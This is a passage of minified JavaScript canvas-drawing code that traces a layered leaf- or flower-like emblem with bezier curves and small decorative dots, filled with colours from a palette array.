      r.bezierCurveTo(e * 185.633544921875, e * 49.985809326171875, e * 168.633544921875, e * 95.98580932617188, e * 191.633544921875, e * 121.98580932617188);
      r.closePath();
      ye(r, i[0]);
      r.globalAlpha = 1;
      r.translate(e * -4, e * -5);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 191.633544921875, e * 123.98580932617188);
      r.bezierCurveTo(e * 215.633544921875, e * 85.98580932617188, e * 187.633544921875, e * 71.98580932617188, e * 202.633544921875, e * 19.985809326171875);
      r.bezierCurveTo(e * 231.633544921875, e * 68.98580932617188, e * 253.633544921875, e * 71.98580932617188, e * 256.633544921875, e * 93.98580932617188);
      r.bezierCurveTo(e * 306.633544921875, e * 64.98580932617188, e * 319.633544921875, e * 61.985809326171875, e * 350.633544921875, e * 58.985809326171875);
      r.bezierCurveTo(e * 280.633544921875, e * 86.98580932617188, e * 281.633544921875, e * 106.98580932617188, e * 268.633544921875, e * 130.98580932617188);
      r.bezierCurveTo(e * 295.633544921875, e * 158.98580932617188, e * 328.633544921875, e * 155.98580932617188, e * 353.633544921875, e * 90.98580932617188);
      r.bezierCurveTo(e * 371.633544921875, e * 158.98580932617188, e * 337.633544921875, e * 210.98580932617188, e * 286.633544921875, e * 209.98580932617188);
      r.bezierCurveTo(e * 323.633544921875, e * 230.98580932617188, e * 317.633544921875, e * 274.9858093261719, e * 356.633544921875, e * 305.9858093261719);
      r.bezierCurveTo(e * 288.633544921875, e * 297.9858093261719, e * 288.633544921875, e * 265.9858093261719, e * 275.633544921875, e * 266.9858093261719);
      r.bezierCurveTo(e * 280.633544921875, e * 294.9858093261719, e * 315.633544921875, e * 306.9858093261719, e * 336.633544921875, e * 316.9858093261719);
      r.bezierCurveTo(e * 295.633544921875, e * 318.9858093261719, e * 264.633544921875, e * 302.9858093261719, e * 254.633544921875, e * 289.9858093261719);
      r.bezierCurveTo(e * 252.633544921875, e * 301.9858093261719, e * 224.633544921875, e * 315.9858093261719, e * 201.633544921875, e * 356.9858093261719);
      r.bezierCurveTo(e * 195.633544921875, e * 313.9858093261719, e * 195.633544921875, e * 308.9858093261719, e * 196.633544921875, e * 307.9858093261719);
      r.bezierCurveTo(e * 197.633544921875, e * 289.9858093261719, e * 207.633544921875, e * 283.9858093261719, e * 195.633544921875, e * 258.9858093261719);
      r.bezierCurveTo(e * 182.633544921875, e * 282.9858093261719, e * 190.633544921875, e * 287.9858093261719, e * 193.633544921875, e * 297.9858093261719);
      r.bezierCurveTo(e * 195.633544921875, e * 306.9858093261719, e * 191.633544921875, e * 334.9858093261719, e * 187.633544921875, e * 354.9858093261719);
      r.bezierCurveTo(e * 165.633544921875, e * 320.9858093261719, e * 138.633544921875, e * 307.9858093261719, e * 135.633544921875, e * 288.9858093261719);
      r.bezierCurveTo(e * 110.633544921875, e * 318.9858093261719, e * 68.633544921875, e * 323.9858093261719, e * 49.633544921875, e * 320.9858093261719);
      r.bezierCurveTo(e * 88.633544921875, e * 308.9858093261719, e * 108.633544921875, e * 284.9858093261719, e * 118.633544921875, e * 258.9858093261719);
      r.bezierCurveTo(e * 86.633544921875, e * 264.9858093261719, e * 75.633544921875, e * 310.9858093261719, e * 19.633544921875, e * 304.9858093261719);
      r.bezierCurveTo(e * 54.633544921875, e * 276.9858093261719, e * 59.633544921875, e * 214.98580932617188, e * 105.633544921875, e * 205.98580932617188);
      r.bezierCurveTo(e * 14.633544921875, e * 201.98580932617188, e * 24.633544921875, e * 141.98580932617188, e * 25.633544921875, e * 82.98580932617188);
      r.bezierCurveTo(e * 49.633544921875, e * 168.98580932617188, e * 87.633544921875, e * 141.98580932617188, e * 112.633544921875, e * 123.98580932617188);
      r.bezierCurveTo(e * 95.633544921875, e * 75.98580932617188, e * 70.633544921875, e * 68.98580932617188, e * 35.633544921875, e * 50.985809326171875);
      r.bezierCurveTo(e * 70.633544921875, e * 53.985809326171875, e * 102.633544921875, e * 65.98580932617188, e * 125.633544921875, e * 84.98580932617188);
      r.bezierCurveTo(e * 133.633544921875, e * 69.98580932617188, e * 166.633544921875, e * 42.985809326171875, e * 176.633544921875, e * 21.985809326171875);
      r.bezierCurveTo(e * 185.633544921875, e * 49.985809326171875, e * 168.633544921875, e * 95.98580932617188, e * 191.633544921875, e * 121.98580932617188);
      r.closePath();
      ye(r, undefined, i[1], e * 12);
      r.translate(e * -1, e * 0);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 270.633544921875, e * 88.98580932617188);
      r.bezierCurveTo(e * 296.633544921875, e * 65.98580932617188, e * 318.633544921875, e * 62.985809326171875, e * 348.633544921875, e * 57.985809326171875);
      r.bezierCurveTo(e * 309.633544921875, e * 76.98580932617188, e * 291.633544921875, e * 88.98580932617188, e * 280.633544921875, e * 99.98580932617188);
      r.closePath();
      ye(r, i[4], i[5], e * 4);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 275.633544921875, e * 281.9858093261719);
      r.bezierCurveTo(e * 303.633544921875, e * 308.9858093261719, e * 321.633544921875, e * 308.9858093261719, e * 335.633544921875, e * 315.9858093261719);
      r.bezierCurveTo(e * 305.633544921875, e * 320.9858093261719, e * 278.633544921875, e * 307.9858093261719, e * 264.633544921875, e * 293.9858093261719);
      r.closePath();
      ye(r, i[4], i[5], e * 4);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 124.633544921875, e * 291.9858093261719);
      r.bezierCurveTo(e * 106.633544921875, e * 316.9858093261719, e * 72.633544921875, e * 325.9858093261719, e * 53.633544921875, e * 319.9858093261719);
      r.bezierCurveTo(e * 83.633544921875, e * 308.9858093261719, e * 97.633544921875, e * 298.9858093261719, e * 112.633544921875, e * 284.9858093261719);
      r.closePath();
      ye(r, i[4], i[5], e * 4);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 113.633544921875, e * 80.98580932617188);
      r.bezierCurveTo(e * 91.633544921875, e * 54.985809326171875, e * 72.633544921875, e * 56.985809326171875, e * 36.633544921875, e * 49.985809326171875);
      r.bezierCurveTo(e * 87.633544921875, e * 72.98580932617188, e * 95.633544921875, e * 82.98580932617188, e * 106.633544921875, e * 96.98580932617188);
      r.closePath();
      ye(r, i[4], i[5], e * 4);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 202.633544921875, e * 20.985809326171875);
      r.bezierCurveTo(e * 219.633544921875, e * 49.985809326171875, e * 259.633544921875, e * 80.98580932617188, e * 255.633544921875, e * 92.98580932617188);
      r.bezierCurveTo(e * 268.633544921875, e * 86.98580932617188, e * 265.633544921875, e * 87.98580932617188, e * 275.633544921875, e * 82.98580932617188);
      r.bezierCurveTo(e * 283.633544921875, e * 87.98580932617188, e * 283.633544921875, e * 87.98580932617188, e * 291.633544921875, e * 92.98580932617188);
      r.bezierCurveTo(e * 269.633544921875, e * 116.98580932617188, e * 270.633544921875, e * 124.98580932617188, e * 267.633544921875, e * 130.98580932617188);
      r.bezierCurveTo(e * 307.633544921875, e * 168.98580932617188, e * 339.633544921875, e * 132.98580932617188, e * 352.633544921875, e * 93.98580932617188);
      r.bezierCurveTo(e * 366.633544921875, e * 145.98580932617188, e * 345.633544921875, e * 207.98580932617188, e * 286.633544921875, e * 208.98580932617188);
      r.bezierCurveTo(e * 315.633544921875, e * 223.98580932617188, e * 327.633544921875, e * 287.9858093261719, e * 355.633544921875, e * 305.9858093261719);
      r.bezierCurveTo(e * 293.633544921875, e * 298.9858093261719, e * 293.633544921875, e * 275.9858093261719, e * 276.633544921875, e * 266.9858093261719);
      r.bezierCurveTo(e * 274.633544921875, e * 282.9858093261719, e * 287.633544921875, e * 288.9858093261719, e * 295.633544921875, e * 296.9858093261719);
      r.bezierCurveTo(e * 287.133544921875, e * 302.4858093261719, e * 287.133544921875, e * 302.4858093261719, e * 278.633544921875, e * 307.9858093261719);
      r.bezierCurveTo(e * 261.633544921875, e * 297.9858093261719, e * 258.633544921875, e * 293.9858093261719, e * 255.633544921875, e * 290.9858093261719);
      r.bezierCurveTo(e * 249.633544921875, e * 301.9858093261719, e * 225.633544921875, e * 320.9858093261719, e * 202.633544921875, e * 354.9858093261719);
      r.bezierCurveTo(e * 195.633544921875, e * 318.9858093261719, e * 196.633544921875, e * 306.9858093261719, e * 198.633544921875, e * 300.9858093261719);
      r.bezierCurveTo(e * 209.633544921875, e * 268.9858093261719, e * 199.633544921875, e * 266.9858093261719, e * 195.633544921875, e * 256.9858093261719);
      r.bezierCurveTo(e * 183.633544921875, e * 274.9858093261719, e * 182.633544921875, e * 281.9858093261719, e * 192.633544921875, e * 305.9858093261719);
      r.bezierCurveTo(e * 194.633544921875, e * 317.9858093261719, e * 191.633544921875, e * 336.9858093261719, e * 186.633544921875, e * 351.9858093261719);
      r.bezierCurveTo(e * 166.633544921875, e * 318.9858093261719, e * 141.633544921875, e * 303.9858093261719, e * 136.633544921875, e * 286.9858093261719);
      r.bezierCurveTo(e * 122.633544921875, e * 303.9858093261719, e * 115.633544921875, e * 305.9858093261719, e * 109.633544921875, e * 306.9858093261719);
      r.bezierCurveTo(e * 101.133544921875, e * 301.9858093261719, e * 94.633544921875, e * 297.9858093261719, e * 92.633544921875, e * 296.9858093261719);
      r.bezierCurveTo(e * 116.633544921875, e * 277.9858093261719, e * 116.633544921875, e * 266.9858093261719, e * 119.633544921875, e * 257.9858093261719);
      r.bezierCurveTo(e * 107.633544921875, e * 257.9858093261719, e * 65.633544921875, e * 308.9858093261719, e * 24.633544921875, e * 303.9858093261719);
      r.bezierCurveTo(e * 51.633544921875, e * 275.9858093261719, e * 64.633544921875, e * 220.98580932617188, e * 108.633544921875, e * 205.98580932617188);
      r.bezierCurveTo(e * 14.633544921875, e * 198.98580932617188, e * 26.633544921875, e * 142.98580932617188, e * 25.633544921875, e * 86.98580932617188);
      r.bezierCurveTo(e * 41.633544921875, e * 155.98580932617188, e * 81.633544921875, e * 148.98580932617188, e * 113.633544921875, e * 124.98580932617188);
      r.bezierCurveTo(e * 102.633544921875, e * 93.98580932617188, e * 95.633544921875, e * 88.98580932617188, e * 89.633544921875, e * 81.98580932617188);
      r.bezierCurveTo(e * 97.633544921875, e * 76.48580932617188, e * 97.633544921875, e * 76.48580932617188, e * 105.633544921875, e * 70.98580932617188);
      r.bezierCurveTo(e * 120.633544921875, e * 78.98580932617188, e * 121.633544921875, e * 81.98580932617188, e * 124.633544921875, e * 86.98580932617188);
      r.bezierCurveTo(e * 132.633544921875, e * 71.98580932617188, e * 160.633544921875, e * 56.985809326171875, e * 175.633544921875, e * 23.985809326171875);
      r.bezierCurveTo(e * 182.633544921875, e * 53.985809326171875, e * 170.633544921875, e * 102.98580932617188, e * 191.633544921875, e * 125.98580932617188);
      r.bezierCurveTo(e * 214.633544921875, e * 89.98580932617188, e * 192.633544921875, e * 58.985809326171875, e * 202.633544921875, e * 20.985809326171875);
      r.closePath();
      ye(r, i[2], i[3], e * 5);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 203.633544921875, e * 21.985809326171875);
      r.bezierCurveTo(e * 223.633544921875, e * 63.985809326171875, e * 227.633544921875, e * 72.98580932617188, e * 235.633544921875, e * 98.98580932617188);
      r.bezierCurveTo(e * 241.633544921875, e * 123.98580932617188, e * 225.633544921875, e * 138.98580932617188, e * 196.633544921875, e * 122.98580932617188);
      r.bezierCurveTo(e * 213.633544921875, e * 93.98580932617188, e * 199.633544921875, e * 49.985809326171875, e * 203.633544921875, e * 26.985809326171875);
      r.closePath();
      ye(r, i[3]);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 175.633544921875, e * 25.985809326171875);
      r.bezierCurveTo(e * 176.633544921875, e * 51.985809326171875, e * 171.633544921875, e * 88.98580932617188, e * 186.633544921875, e * 121.98580932617188);
      r.bezierCurveTo(e * 156.633544921875, e * 144.98580932617188, e * 139.633544921875, e * 120.98580932617188, e * 147.633544921875, e * 97.98580932617188);
      r.bezierCurveTo(e * 152.633544921875, e * 77.98580932617188, e * 162.633544921875, e * 60.985809326171875, e * 176.633544921875, e * 25.985809326171875);
      r.closePath();
      ye(r, i[3]);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 26.633544921875, e * 96.98580932617188);
      r.bezierCurveTo(e * 38.633544921875, e * 151.98580932617188, e * 61.633544921875, e * 161.98580932617188, e * 88.633544921875, e * 168.98580932617188);
      r.bezierCurveTo(e * 117.633544921875, e * 177.98580932617188, e * 113.633544921875, e * 185.98580932617188, e * 106.633544921875, e * 204.98580932617188);
      r.bezierCurveTo(e * 32.633544921875, e * 204.98580932617188, e * 25.633544921875, e * 149.98580932617188, e * 25.633544921875, e * 97.98580932617188);
      r.closePath();
      ye(r, i[3]);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 351.633544921875, e * 99.98580932617188);
      r.bezierCurveTo(e * 365.633544921875, e * 161.98580932617188, e * 333.633544921875, e * 203.98580932617188, e * 287.633544921875, e * 207.98580932617188);
      r.bezierCurveTo(e * 255.633544921875, e * 208.98580932617188, e * 266.633544921875, e * 174.98580932617188, e * 285.633544921875, e * 176.98580932617188);
      r.bezierCurveTo(e * 313.633544921875, e * 178.98580932617188, e * 348.633544921875, e * 135.98580932617188, e * 353.633544921875, e * 99.98580932617188);
      r.closePath();
      ye(r, i[3]);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 350.633544921875, e * 302.9858093261719);
      r.bezierCurveTo(e * 310.633544921875, e * 280.9858093261719, e * 314.633544921875, e * 244.98580932617188, e * 292.633544921875, e * 230.98580932617188);
      r.bezierCurveTo(e * 272.633544921875, e * 215.98580932617188, e * 263.633544921875, e * 222.98580932617188, e * 256.633544921875, e * 236.98580932617188);
      r.bezierCurveTo(e * 251.633544921875, e * 249.98580932617188, e * 264.633544921875, e * 255.98580932617188, e * 279.633544921875, e * 268.9858093261719);
      r.bezierCurveTo(e * 306.633544921875, e * 295.9858093261719, e * 325.633544921875, e * 299.9858093261719, e * 349.633544921875, e * 302.9858093261719);
      r.closePath();
      ye(r, i[3]);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 95.633544921875, e * 224.98580932617188);
      r.bezierCurveTo(e * 64.633544921875, e * 245.98580932617188, e * 62.633544921875, e * 280.9858093261719, e * 32.633544921875, e * 303.9858093261719);
      r.bezierCurveTo(e * 59.633544921875, e * 301.9858093261719, e * 102.633544921875, e * 260.9858093261719, e * 116.633544921875, e * 255.98580932617188);
      r.bezierCurveTo(e * 139.633544921875, e * 229.98580932617188, e * 108.633544921875, e * 209.98580932617188, e * 97.633544921875, e * 224.98580932617188);
      r.closePath();
      ye(r, i[3]);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 195.633544921875, e * 253.98580932617188);
      r.bezierCurveTo(e * 209.633544921875, e * 282.9858093261719, e * 205.633544921875, e * 278.9858093261719, e * 199.633544921875, e * 307.9858093261719);
      r.bezierCurveTo(e * 198.633544921875, e * 332.9858093261719, e * 201.633544921875, e * 340.9858093261719, e * 202.633544921875, e * 348.9858093261719);
      r.bezierCurveTo(e * 215.633544921875, e * 313.9858093261719, e * 226.633544921875, e * 291.9858093261719, e * 235.633544921875, e * 270.9858093261719);
      r.bezierCurveTo(e * 243.633544921875, e * 247.98580932617188, e * 219.633544921875, e * 235.98580932617188, e * 196.633544921875, e * 252.98580932617188);
      r.closePath();
      ye(r, i[3]);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 195.633544921875, e * 251.98580932617188);
      r.bezierCurveTo(e * 176.633544921875, e * 275.9858093261719, e * 182.633544921875, e * 285.9858093261719, e * 191.633544921875, e * 308.9858093261719);
      r.bezierCurveTo(e * 194.633544921875, e * 318.9858093261719, e * 190.633544921875, e * 334.9858093261719, e * 186.633544921875, e * 348.9858093261719);
      r.bezierCurveTo(e * 175.633544921875, e * 307.9858093261719, e * 157.633544921875, e * 291.9858093261719, e * 155.633544921875, e * 272.9858093261719);
      r.bezierCurveTo(e * 150.633544921875, e * 243.98580932617188, e * 170.633544921875, e * 236.98580932617188, e * 195.633544921875, e * 251.98580932617188);
      r.closePath();
      ye(r, i[3]);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 316, e * 186.8020782470703);
      r.bezierCurveTo(e * 315, e * 173.8020782470703, e * 298, e * 177.8020782470703, e * 293, e * 183.8020782470703);
      r.bezierCurveTo(e * 285, e * 195.8020782470703, e * 314, e * 197.8020782470703, e * 315, e * 187.8020782470703);
      r.closePath();
      ye(r, i[6], i[7], e * 4);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 340, e * 157.8020782470703);
      r.bezierCurveTo(e * 327, e * 153.8020782470703, e * 321, e * 168.8020782470703, e * 330, e * 174.8020782470703);
      r.bezierCurveTo(e * 341, e * 178.8020782470703, e * 347, e * 161.8020782470703, e * 341, e * 157.8020782470703);
      r.closePath();
      ye(r, i[6], i[7], e * 4);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 349, e * 136.8020782470703);
      r.bezierCurveTo(e * 343, e * 135.8020782470703, e * 342, e * 139.8020782470703, e * 341, e * 147.8020782470703);
      r.bezierCurveTo(e * 343, e * 155.8020782470703, e * 353, e * 143.8020782470703, e * 349, e * 137.8020782470703);
      r.closePath();
      ye(r, i[6], i[7], e * 4);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 278.75, e * 246.4375);
      r.bezierCurveTo(e * 288.75, e * 242.4375, e * 301.75, e * 248.4375, e * 298.75, e * 262.4375);
      r.bezierCurveTo(e * 293.75, e * 271.4375, e * 287.75, e * 271.4375, e * 278.75, e * 262.4375);
      r.bezierCurveTo(e * 271.75, e * 255.4375, e * 274.75, e * 250.4375, e * 277.75, e * 247.4375);
      r.closePath();
      ye(r, i[6], i[7], e * 4);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 310.75, e * 277.4375);
      r.bezierCurveTo(e * 319.75, e * 280.4375, e * 322.75, e * 283.4375, e * 321.75, e * 289.4375);
      r.bezierCurveTo(e * 319.75, e * 295.4375, e * 313.75, e * 291.4375, e * 308.75, e * 288.4375);
      r.bezierCurveTo(e * 301.75, e * 281.4375, e * 306.75, e * 277.4375, e * 309.75, e * 277.4375);
      r.closePath();
      ye(r, i[6], i[7], e * 4);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 217.75, e * 257.4375);
      r.bezierCurveTo(e * 227.75, e * 269.4375, e * 220.75, e * 281.4375, e * 212.75, e * 280.4375);
      r.bezierCurveTo(e * 206.75, e * 279.4375, e * 206.75, e * 269.4375, e * 204.75, e * 260.4375);
      r.bezierCurveTo(e * 204.75, e * 254.4375, e * 211.75, e * 253.4375, e * 216.75, e * 256.4375);
      r.closePath();
      ye(r, i[6], i[7], e * 4);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 211.75, e * 289.4375);
      r.bezierCurveTo(e * 219.75, e * 292.4375, e * 213.75, e * 306.4375, e * 206.75, e * 307.4375);
      r.bezierCurveTo(e * 199.75, e * 303.4375, e * 209.75, e * 287.4375, e * 210.75, e * 289.4375);
      r.closePath();
      ye(r, i[6], i[7], e * 4);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 171.75, e * 256.4375);
      r.bezierCurveTo(e * 162.75, e * 273.4375, e * 166.75, e * 278.4375, e * 175.75, e * 280.4375);
      r.bezierCurveTo(e * 183.75, e * 278.4375, e * 185.75, e * 257.4375, e * 182.75, e * 255.4375);
      r.bezierCurveTo(e * 176.75, e * 251.4375, e * 172.75, e * 253.4375, e * 172.75, e * 256.4375);
      r.closePath();
      ye(r, i[6], i[7], e * 4);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 175.75, e * 289.9375);
      r.bezierCurveTo(e * 183.75, e * 287.9375, e * 186.75, e * 301.9375, e * 182.75, e * 305.9375);
      r.bezierCurveTo(e * 176.75, e * 307.9375, e * 171.75, e * 292.9375, e * 174.75, e * 290.9375);
      r.closePath();
      ye(r, i[6], i[7], e * 4);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 205.75, e * 314.4375);
      r.bezierCurveTo(e * 209.75, e * 316.4375, e * 210.75, e * 320.4375, e * 206.75, e * 323.4375);
      r.bezierCurveTo(e * 201.75, e * 324.4375, e * 201.75, e * 314.4375, e * 204.75, e * 314.4375);
      r.closePath();
      ye(r, i[6], i[7], e * 4);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 186.75, e * 313.4375);
      r.bezierCurveTo(e * 181.75, e * 315.4375, e * 180.75, e * 321.4375, e * 185.75, e * 326.4375);
      r.bezierCurveTo(e * 190.75, e * 327.4375, e * 190.75, e * 313.4375, e * 187.75, e * 314.4375);
      r.closePath();
      ye(r, i[6], i[7], e * 4);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 103.75, e * 244.4375);
      r.bezierCurveTo(e * 96.75, e * 239.4375, e * 83.75, e * 240.4375, e * 81.75, e * 255.4375);
      r.bezierCurveTo(e * 80.75, e * 264.4375, e * 89.75, e * 269.4375, e * 99.75, e * 260.4375);
      r.bezierCurveTo(e * 106.75, e * 254.4375, e * 106.75, e * 250.4375, e * 104.75, e * 245.4375);
      r.closePath();
      ye(r, i[6], i[7], e * 4);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 86.75, e * 182.4375);
      r.bezierCurveTo(e * 82.75, e * 170.4375, e * 66.75, e * 169.4375, e * 61.75, e * 181.4375);
      r.bezierCurveTo(e * 58.75, e * 187.4375, e * 68.75, e * 194.4375, e * 75.75, e * 192.4375);
      r.bezierCurveTo(e * 83.75, e * 192.4375, e * 86.75, e * 187.4375, e * 86.75, e * 183.4375);
      r.closePath();
      ye(r, i[6], i[7], e * 4);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 44.75, e * 152.4375);
      r.bezierCurveTo(e * 55.75, e * 159.4375, e * 54.75, e * 170.4375, e * 46.75, e * 171.4375);
      r.bezierCurveTo(e * 39.75, e * 170.4375, e * 34.75, e * 151.4375, e * 43.75, e * 152.4375);
      r.closePath();
      ye(r, i[6], i[7], e * 4);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 31.75, e * 130.4375);
      r.bezierCurveTo(e * 35.75, e * 132.4375, e * 35.75, e * 131.4375, e * 37.75, e * 137.4375);
      r.bezierCurveTo(e * 36.75, e * 144.4375, e * 36.75, e * 145.4375, e * 33.75, e * 144.4375);
      r.bezierCurveTo(e * 26.75, e * 137.4375, e * 29.75, e * 131.4375, e * 31.75, e * 130.4375);
      r.closePath();
      ye(r, i[6], i[7], e * 4);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 69.75, e * 274.4375);
      r.bezierCurveTo(e * 62.75, e * 272.4375, e * 59.75, e * 277.4375, e * 57.75, e * 284.4375);
      r.bezierCurveTo(e * 56.75, e * 290.4375, e * 63.75, e * 289.4375, e * 71.75, e * 282.4375);
      r.bezierCurveTo(e * 75.75, e * 277.4375, e * 72.75, e * 275.4375, e * 69.75, e * 274.4375);
      r.closePath();
      ye(r, i[6], i[7], e * 4);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 165.75, e * 95.4375);
      r.bezierCurveTo(e * 177.75, e * 97.4375, e * 182.75, e * 115.4375, e * 173.75, e * 121.4375);
      r.bezierCurveTo(e * 164.75, e * 126.4375, e * 149.75, e * 102.4375, e * 164.75, e * 96.4375);
      r.closePath();
      ye(r, i[6], i[7], e * 4);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 216.75, e * 94.4375);
      r.bezierCurveTo(e * 227.75, e * 99.4375, e * 223.75, e * 122.4375, e * 210.75, e * 119.4375);
      r.bezierCurveTo(e * 203.75, e * 115.4375, e * 207.75, e * 93.4375, e * 216.75, e * 94.4375);
      r.closePath();
      ye(r, i[6], i[7], e * 4);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 211.75, e * 68.4375);
      r.bezierCurveTo(e * 218.75, e * 69.4375, e * 220.75, e * 77.4375, e * 216.75, e * 83.4375);
      r.bezierCurveTo(e * 208.75, e * 89.4375, e * 205.75, e * 68.4375, e * 210.75, e * 68.4375);
      r.closePath();
      ye(r, i[6], i[7], e * 4);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 169.75, e * 71.4375);
      r.bezierCurveTo(e * 162.75, e * 72.4375, e * 159.75, e * 83.4375, e * 167.75, e * 88.4375);
      r.bezierCurveTo(e * 174.75, e * 90.4375, e * 174.75, e * 72.4375, e * 170.75, e * 71.4375);
      r.closePath();
      ye(r, i[6], i[7], e * 4);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 193.75, e * 160.4375);
      r.bezierCurveTo(e * 215.75, e * 168.4375, e * 224.75, e * 180.4375, e * 229.75, e * 193.4375);
      r.bezierCurveTo(e * 223.75, e * 211.4375, e * 205.75, e * 225.4375, e * 193.75, e * 229.4375);
      r.bezierCurveTo(e * 167.75, e * 217.4375, e * 161.75, e * 205.4375, e * 156.75, e * 192.4375);
      r.bezierCurveTo(e * 164.75, e * 175.4375, e * 176.75, e * 166.4375, e * 192.75, e * 160.4375);
      r.closePath();
      ye(r, i[8], i[9], e * 3);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 189.1999969482422, e * 182.61249923706055);
      r.bezierCurveTo(e * 190.1999969482422, e * 184.11249923706055, e * 190.1999969482422, e * 184.11249923706055, e * 191.1999969482422, e * 185.61249923706055);
      r.bezierCurveTo(e * 192.1999969482422, e * 180.61249923706055, e * 192.1999969482422, e * 180.61249923706055, e * 193.1999969482422, e * 175.61249923706055);
      r.bezierCurveTo(e * 195.6999969482422, e * 177.11249923706055, e * 195.6999969482422, e * 177.11249923706055, e * 198.1999969482422, e * 178.61249923706055);
      r.bezierCurveTo(e * 198.1999969482422, e * 181.11249923706055, e * 198.1999969482422, e * 181.11249923706055, e * 198.1999969482422, e * 183.61249923706055);
      r.bezierCurveTo(e * 201.6999969482422, e * 181.11249923706055, e * 201.6999969482422, e * 181.11249923706055, e * 205.1999969482422, e * 178.61249923706055);
      r.bezierCurveTo(e * 206.6999969482422, e * 180.61249923706055, e * 206.6999969482422, e * 180.61249923706055, e * 208.1999969482422, e * 182.61249923706055);
      r.bezierCurveTo(e * 206.1999969482422, e * 185.61249923706055, e * 206.1999969482422, e * 185.61249923706055, e * 204.1999969482422, e * 188.61249923706055);
      r.bezierCurveTo(e * 208.6999969482422, e * 188.61249923706055, e * 208.6999969482422, e * 188.61249923706055, e * 213.1999969482422, e * 188.61249923706055);
      r.bezierCurveTo(e * 213.1999969482422, e * 191.11249923706055, e * 213.1999969482422, e * 191.11249923706055, e * 213.1999969482422, e * 193.61249923706055);
      r.bezierCurveTo(e * 209.6999969482422, e * 194.61249923706055, e * 209.6999969482422, e * 194.61249923706055, e * 206.1999969482422, e * 195.61249923706055);
      r.bezierCurveTo(e * 210.1999969482422, e * 198.61249923706055, e * 210.1999969482422, e * 198.61249923706055, e * 214.1999969482422, e * 201.61249923706055);
      r.bezierCurveTo(e * 212.1999969482422, e * 203.61249923706055, e * 212.1999969482422, e * 203.61249923706055, e * 210.1999969482422, e * 205.61249923706055);
      r.bezierCurveTo(e * 207.1999969482422, e * 204.11249923706055, e * 207.1999969482422, e * 204.11249923706055, e * 204.1999969482422, e * 202.61249923706055);
      r.bezierCurveTo(e * 205.6999969482422, e * 207.61249923706055, e * 205.6999969482422, e * 207.61249923706055, e * 207.1999969482422, e * 212.61249923706055);
      r.bezierCurveTo(e * 204.6999969482422, e * 213.61249923706055, e * 204.6999969482422, e * 213.61249923706055, e * 202.1999969482422, e * 214.61249923706055);
      r.bezierCurveTo(e * 200.1999969482422, e * 210.61249923706055, e * 200.1999969482422, e * 210.61249923706055, e * 198.1999969482422, e * 206.61249923706055);
      r.bezierCurveTo(e * 196.6999969482422, e * 211.61249923706055, e * 196.6999969482422, e * 211.61249923706055, e * 195.1999969482422, e * 216.61249923706055);
      r.bezierCurveTo(e * 192.6999969482422, e * 216.11249923706055, e * 192.6999969482422, e * 216.11249923706055, e * 190.1999969482422, e * 215.61249923706055);
      r.bezierCurveTo(e * 190.1999969482422, e * 211.61249923706055, e * 190.1999969482422, e * 211.61249923706055, e * 190.1999969482422, e * 207.61249923706055);
      r.bezierCurveTo(e * 186.1999969482422, e * 210.61249923706055, e * 186.1999969482422, e * 210.61249923706055, e * 182.1999969482422, e * 213.61249923706055);
      r.bezierCurveTo(e * 181.1999969482422, e * 211.11249923706055, e * 181.1999969482422, e * 211.11249923706055, e * 180.1999969482422, e * 208.61249923706055);
      r.bezierCurveTo(e * 183.1999969482422, e * 205.61249923706055, e * 183.1999969482422, e * 205.61249923706055, e * 186.1999969482422, e * 202.61249923706055);
